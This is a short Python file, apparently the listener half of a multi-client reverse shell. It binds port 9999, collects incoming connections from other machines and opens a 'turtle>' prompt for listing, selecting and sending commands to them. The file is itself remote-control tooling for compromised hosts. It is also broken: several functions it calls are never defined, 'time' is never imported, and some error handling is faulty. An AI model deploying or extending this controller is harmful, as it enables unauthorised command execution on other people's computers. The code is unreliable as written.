import socket
import threading
import sys
from queue import Queue


NUMBER_OF_THREAIDNG = 2
JOB_NUMBER = [1, 2]

queue = Queue()
all_connections = []
all_addresses = []


# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind a socket to the port and waiting connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to the port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + msg + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()


# Accept connections from multiole clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, adrress = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(adrress)
            print("\nConnection has been establish: " + str(adrress[0]))
        except:
            print("Error accepting connections")


# Interactibe prompt for sending commands remotely
def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
            continue
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else: 
            print("Command not recognized")
